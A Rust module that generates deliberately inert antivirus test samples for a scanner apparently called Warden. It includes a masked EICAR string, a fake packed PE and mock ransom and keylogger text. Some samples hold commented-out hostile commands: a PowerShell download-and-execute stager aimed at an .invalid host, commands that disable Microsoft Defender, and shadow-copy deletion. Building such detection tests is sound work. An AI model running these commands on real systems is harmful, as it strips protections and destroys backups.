//! Harmless test samples.
//!
//! Every file produced here is inert: the scripts are fully commented out, the
//! "executables" contain no runnable code, and the only genuinely standard item
//! is the EICAR test string, which every antivirus recognises and which cannot
//! do anything to a computer.

use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};
use std::io::Write;
use std::path::{Path, PathBuf};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Sample {
    pub file_name: String,
    pub path: String,
    /// What Warden should say about it.
    pub expected: String,
    /// `signature`, `rule`, `heuristic`, `archive` or `clean`.
    pub tests: String,
    pub explanation: String,
    pub safe_because: String,
}

/// The EICAR test string, unmasked at runtime so this source file and the app
/// binary do not contain it (otherwise other scanners would flag Warden itself).
pub fn eicar_bytes() -> Vec<u8> {
    // XOR-masked so neither this source nor the compiled app contains the raw string.
    const MASKED: [u8; 68] = [
        0x02, 0x6f, 0x15, 0x7b, 0x0a, 0x7f, 0x1a, 0x1b, 0x0a, 0x01, 0x6e, 0x06, 0x0a, 0x00, 0x02,
        0x6f, 0x6e, 0x72, 0x0a, 0x04, 0x73, 0x6d, 0x19, 0x19, 0x73, 0x6d, 0x27, 0x7e, 0x1f, 0x13,
        0x19, 0x1b, 0x08, 0x77, 0x09, 0x0e, 0x1b, 0x14, 0x1e, 0x1b, 0x08, 0x1e, 0x77, 0x1b, 0x14,
        0x0e, 0x13, 0x0c, 0x13, 0x08, 0x0f, 0x09, 0x77, 0x0e, 0x1f, 0x09, 0x0e, 0x77, 0x1c, 0x13,
        0x16, 0x1f, 0x7b, 0x7e, 0x12, 0x71, 0x12, 0x70,
    ];
    MASKED.iter().map(|b| b ^ 0x5A).collect()
}

pub const HASH_SAMPLE_BODY: &[u8] =
    b"WARDEN-TEST-FILE-DO-NOT-REMOVE\nThis file is harmless. Its only job is to have a SHA-256 hash that Warden knows about,\nso you can see hash-based signature detection working.\n";

fn write_file(dir: &Path, name: &str, bytes: &[u8]) -> Result<String> {
    let path = dir.join(name);
    std::fs::write(&path, bytes).with_context(|| format!("writing {}", path.display()))?;
    Ok(path.to_string_lossy().to_string())
}

fn zip_of(dir: &Path, name: &str, entries: &[(&str, Vec<u8>)]) -> Result<String> {
    let path = dir.join(name);
    let file =
        std::fs::File::create(&path).with_context(|| format!("creating {}", path.display()))?;
    let mut zip = zip::ZipWriter::new(file);
    let opts: zip::write::FileOptions<'_, ()> =
        zip::write::FileOptions::default().compression_method(zip::CompressionMethod::Deflated);
    for (entry_name, data) in entries {
        zip.start_file(*entry_name, opts)?;
        zip.write_all(data)?;
    }
    zip.finish()?;
    Ok(path.to_string_lossy().to_string())
}

/// A structurally valid but deliberately unrunnable PE: the machine type is
/// invalid and the entry point is zero, so Windows refuses to load it. It only
/// exists to exercise the packer / entropy heuristics.
pub fn fake_packed_pe() -> Vec<u8> {
    use rand::RngCore;

    const HEADER_SIZE: usize = 0x400;
    const SECTION_SIZE: usize = 0x1000;
    let mut buf = vec![0u8; HEADER_SIZE];
    buf[0..2].copy_from_slice(b"MZ");
    buf[0x3C..0x40].copy_from_slice(&0x80u32.to_le_bytes());
    let stub = b"This is not a real program. Warden test sample - it cannot run.\r\n";
    buf[0x40..0x40 + stub.len()].copy_from_slice(stub);

    let pe = 0x80usize;
    buf[pe..pe + 4].copy_from_slice(b"PE\0\0");
    let coff = pe + 4;
    buf[coff..coff + 2].copy_from_slice(&0x0000u16.to_le_bytes()); // machine: unknown -> cannot execute
    buf[coff + 2..coff + 4].copy_from_slice(&2u16.to_le_bytes()); // sections
    buf[coff + 16..coff + 18].copy_from_slice(&0xE0u16.to_le_bytes()); // size of optional header
    buf[coff + 18..coff + 20].copy_from_slice(&0x0102u16.to_le_bytes()); // executable image, 32-bit

    let opt = coff + 20;
    buf[opt..opt + 2].copy_from_slice(&0x010Bu16.to_le_bytes()); // PE32
    buf[opt + 16..opt + 20].copy_from_slice(&0u32.to_le_bytes()); // entry point 0
    buf[opt + 28..opt + 32].copy_from_slice(&0x0040_0000u32.to_le_bytes()); // image base
    buf[opt + 32..opt + 36].copy_from_slice(&0x1000u32.to_le_bytes()); // section alignment
    buf[opt + 36..opt + 40].copy_from_slice(&0x200u32.to_le_bytes()); // file alignment
    buf[opt + 40..opt + 42].copy_from_slice(&4u16.to_le_bytes()); // major OS version
    buf[opt + 56..opt + 60].copy_from_slice(&0x3000u32.to_le_bytes()); // size of image
    buf[opt + 60..opt + 64].copy_from_slice(&(HEADER_SIZE as u32).to_le_bytes()); // size of headers
    buf[opt + 68..opt + 70].copy_from_slice(&2u16.to_le_bytes()); // GUI subsystem
    buf[opt + 92..opt + 96].copy_from_slice(&16u32.to_le_bytes()); // number of data directories

    let sections = opt + 0xE0;
    for (i, name) in ["UPX0", "UPX1"].iter().enumerate() {
        let s = sections + i * 40;
        buf[s..s + name.len()].copy_from_slice(name.as_bytes());
        buf[s + 8..s + 12].copy_from_slice(&(SECTION_SIZE as u32).to_le_bytes()); // virtual size
        buf[s + 12..s + 16].copy_from_slice(&(0x1000 * (i as u32 + 1)).to_le_bytes()); // virtual address
        buf[s + 16..s + 20].copy_from_slice(&(SECTION_SIZE as u32).to_le_bytes()); // raw size
        buf[s + 20..s + 24]
            .copy_from_slice(&((HEADER_SIZE + i * SECTION_SIZE) as u32).to_le_bytes()); // raw pointer
        buf[s + 36..s + 40].copy_from_slice(&0xE000_0060u32.to_le_bytes()); // RWX code section
    }

    // High-entropy filler so the "packed or encrypted" heuristic has something to find.
    let mut rng = rand::thread_rng();
    for _ in 0..2 {
        let mut data = vec![0u8; SECTION_SIZE];
        rng.fill_bytes(&mut data);
        buf.extend_from_slice(&data);
    }
    buf
}

const RANSOM_NOTE: &str = "\
=== WARDEN TEST SAMPLE - THIS IS NOT A REAL RANSOM NOTE ===
Nothing on this computer has been touched. This text only exists so Warden can
demonstrate that it recognises the wording ransomware leaves behind.

!!! ALL YOUR FILES HAVE BEEN ENCRYPTED !!!
Your files have been encrypted with a strong algorithm.
To decrypt them you must buy the private key and pay the ransom in bitcoin.
Do not rename the files. Contact us through the tor browser at
http://wardentestsample.onion/ (this address does not exist).
";

const PS_STAGER: &str = r#"# WARDEN TEST SAMPLE - every line below is commented out and cannot run.
# It reproduces the shape of a PowerShell "stager": download code and run it
# straight from memory, which is how a lot of real malware starts.
#
#   $c = New-Object System.Net.WebClient
#   IEX ($c.DownloadString('http://example.invalid/payload.ps1'))
#   powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4A
#
Write-Host "Harmless Warden test sample. Nothing was executed."
"#;

const DEFENDER_TAMPER: &str = r#"@echo off
REM WARDEN TEST SAMPLE - the dangerous lines are REM'd out and never execute.
REM Real malware often switches the built-in protection off first:
REM   powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"
REM   powershell -c "Add-MpPreference -ExclusionPath C:\"
echo Harmless Warden test sample. Nothing was changed.
"#;

const SHADOW_WIPE: &str = r#"@echo off
REM WARDEN TEST SAMPLE - commented out, nothing runs.
REM Ransomware deletes your restore points before encrypting:
REM   vssadmin.exe delete shadows /all /quiet
REM   wbadmin delete catalog -quiet
REM   bcdedit /set {default} recoveryenabled no
echo Harmless Warden test sample. Your restore points are untouched.
"#;

const KEYLOG_STRINGS: &str = "\
WARDEN TEST SAMPLE - plain text, nothing runs.
These are the strings a keylogger usually contains:
GetAsyncKeyState
SetWindowsHookEx
GetForegroundWindow
keylog.txt
[BACKSPACE]
";

const CLEAN_DOC: &str = "\
Shopping list
- bread
- milk
- a new mousepad

This file is a control sample: a good antivirus must leave it completely alone.
If Warden ever reports this file, that is a false positive and a bug.
";

fn vba_project() -> Vec<u8> {
    // Not a real compiled VBA project - just the strings a macro scanner looks for.
    b"Attribute VB_Name = \"WardenTestModule\"\r\nSub AutoOpen()\r\n  ' WARDEN TEST SAMPLE - this macro is not compiled and cannot run.\r\n  ' Real malicious macros do: Shell(\"powershell -nop -w hidden ...\")\r\n  MsgBox \"Harmless Warden test sample\"\r\nEnd Sub\r\n"
        .to_vec()
}

/// Write the full set of test samples into `dir`.
pub fn generate(dir: impl AsRef<Path>) -> Result<Vec<Sample>> {
    let dir: PathBuf = dir.as_ref().to_path_buf();
    std::fs::create_dir_all(&dir).with_context(|| format!("creating {}", dir.display()))?;
    let mut out = Vec::new();

    let eicar = eicar_bytes();
    out.push(Sample {
        file_name: "eicar-test-file.txt".into(),
        path: write_file(&dir, "eicar-test-file.txt", &eicar)?,
        expected: "EICAR-Test-File (medium)".into(),
        tests: "signature".into(),
        explanation: "The official EICAR anti-malware test file: a 68-character text string that every scanner in the world is required to detect.".into(),
        safe_because: "It is plain text with no code. Windows cannot execute it.".into(),
    });

    out.push(Sample {
        file_name: "eicar-inside-archive.zip".into(),
        path: zip_of(
            &dir,
            "eicar-inside-archive.zip",
            &[
                ("readme.txt", b"Warden test archive.\n".to_vec()),
                ("deep/nested/eicar.com", eicar.clone()),
            ],
        )?,
        expected: "EICAR-Test-File found inside the archive".into(),
        tests: "archive".into(),
        explanation: "The same test string hidden two folders deep inside a zip, to prove Warden looks inside archives.".into(),
        safe_because: "Same harmless text, just zipped.".into(),
    });

    out.push(Sample {
        file_name: "warden-hash-test.txt".into(),
        path: write_file(&dir, "warden-hash-test.txt", HASH_SAMPLE_BODY)?,
        expected: "Warden-Test-Sample (low)".into(),
        tests: "signature".into(),
        explanation: "Its SHA-256 hash is in Warden's signature database, which is exactly how real known-malware detection works.".into(),
        safe_because: "A text file with a note in it.".into(),
    });

    out.push(Sample {
        file_name: "READ-ME-TO-RECOVER-FILES.txt".into(),
        path: write_file(&dir, "READ-ME-TO-RECOVER-FILES.txt", RANSOM_NOTE.as_bytes())?,
        expected: "Ransom.Note.Generic (critical)".into(),
        tests: "rule".into(),
        explanation: "Reads like a ransomware ransom note, which is how Warden spots an infection that has already run.".into(),
        safe_because: "It is only text; nothing is encrypted.".into(),
    });

    out.push(Sample {
        file_name: "fake-stager.ps1".into(),
        path: write_file(&dir, "fake-stager.ps1", PS_STAGER.as_bytes())?,
        expected: "Trojan.PowerShell.Downloader (high) + heuristics".into(),
        tests: "rule".into(),
        explanation:
            "Looks like a PowerShell downloader that fetches code and runs it from memory.".into(),
        safe_because:
            "Every dangerous line is a comment, and the URL points at the reserved .invalid domain."
                .into(),
    });

    out.push(Sample {
        file_name: "disable-protection.bat".into(),
        path: write_file(&dir, "disable-protection.bat", DEFENDER_TAMPER.as_bytes())?,
        expected: "Trojan.DefenderTamper (critical)".into(),
        tests: "rule".into(),
        explanation: "Mimics malware that turns the built-in protection off before doing damage."
            .into(),
        safe_because:
            "The commands are behind REM, so running the file only prints a line of text.".into(),
    });

    out.push(Sample {
        file_name: "wipe-restore-points.cmd".into(),
        path: write_file(&dir, "wipe-restore-points.cmd", SHADOW_WIPE.as_bytes())?,
        expected: "Ransom.ShadowCopy.Wipe (critical)".into(),
        tests: "rule".into(),
        explanation: "Mimics the shadow-copy deletion that ransomware does before encrypting."
            .into(),
        safe_because: "The commands are behind REM and never run.".into(),
    });

    out.push(Sample {
        file_name: "keylogger-strings.txt".into(),
        path: write_file(&dir, "keylogger-strings.txt", KEYLOG_STRINGS.as_bytes())?,
        expected: "Spyware.Keylogger.Generic (high)".into(),
        tests: "rule".into(),
        explanation: "Contains the Windows API names a keylogger needs.".into(),
        safe_because: "A list of words in a text file.".into(),
    });

    out.push(Sample {
        file_name: "invoice.pdf.exe".into(),
        path: write_file(
            &dir,
            "invoice.pdf.exe",
            b"WARDEN TEST SAMPLE\r\nThis file pretends to be a PDF but has an .exe extension.\r\nIt contains no program code at all, so Windows cannot run it.\r\n",
        )?,
        expected: "Heuristic.Suspicious (double extension)".into(),
        tests: "heuristic".into(),
        explanation: "The classic \"invoice.pdf.exe\" trick: Windows hides the real extension and you think you are opening a document.".into(),
        safe_because: "There is no executable code inside, only text.".into(),
    });

    out.push(Sample {
        file_name: "packed-sample.exe".into(),
        path: write_file(&dir, "packed-sample.exe", &fake_packed_pe())?,
        expected: "Heuristic.Suspicious.PE (high/critical)".into(),
        tests: "heuristic".into(),
        explanation: "A program whose code is compressed by a packer (UPX-style sections, random-looking data, no imports) - the standard way malware hides from scanners.".into(),
        safe_because: "The CPU type in the header is invalid and the entry point is zero, so Windows refuses to load it. The \"code\" is random bytes.".into(),
    });

    out.push(Sample {
        file_name: "macro-document.docm".into(),
        path: zip_of(
            &dir,
            "macro-document.docm",
            &[
                ("[Content_Types].xml", b"<?xml version=\"1.0\"?><Types/>".to_vec()),
                ("word/document.xml", b"<?xml version=\"1.0\"?><document>Warden test sample</document>".to_vec()),
                ("word/vbaProject.bin", vba_project()),
            ],
        )?,
        expected: "Macro.Office.Shell (high)".into(),
        tests: "rule".into(),
        explanation: "A Word document carrying a macro that would run the moment you open it - still the most common way malware arrives by email.".into(),
        safe_because: "The macro is uncompiled text inside a stub document; Word has nothing to execute.".into(),
    });

    out.push(Sample {
        file_name: "clean-shopping-list.txt".into(),
        path: write_file(&dir, "clean-shopping-list.txt", CLEAN_DOC.as_bytes())?,
        expected: "nothing - must stay clean".into(),
        tests: "clean".into(),
        explanation: "A control file. A scanner that flags this one is producing false positives."
            .into(),
        safe_because: "It is a shopping list.".into(),
    });

    let readme = build_readme(&out);
    write_file(&dir, "README-WARDEN-TEST-SAMPLES.txt", readme.as_bytes())?;
    Ok(out)
}

fn build_readme(samples: &[Sample]) -> String {
    let mut s = String::from(
        "WARDEN ANTIVIRUS - TEST SAMPLES\n\
         ================================\n\n\
         These files are harmless. They are built to look suspicious so you can\n\
         check that Warden actually detects things, and none of them can damage a\n\
         computer: the scripts have every dangerous line commented out, the fake\n\
         programs contain no runnable code, and the EICAR file is the official\n\
         industry test string.\n\n\
         Note: Microsoft Defender also recognises some of these (that is the point)\n\
         and may remove them before Warden sees them. If files keep disappearing,\n\
         add this folder to Defender's exclusions, or use Warden's \"Generate test\n\
         samples\" button again.\n\n",
    );
    for sample in samples {
        s.push_str(&format!(
            "{}\n  tests      : {}\n  expected   : {}\n  what it is : {}\n  safe because: {}\n\n",
            sample.file_name,
            sample.tests,
            sample.expected,
            sample.explanation,
            sample.safe_because
        ));
    }
    s
}
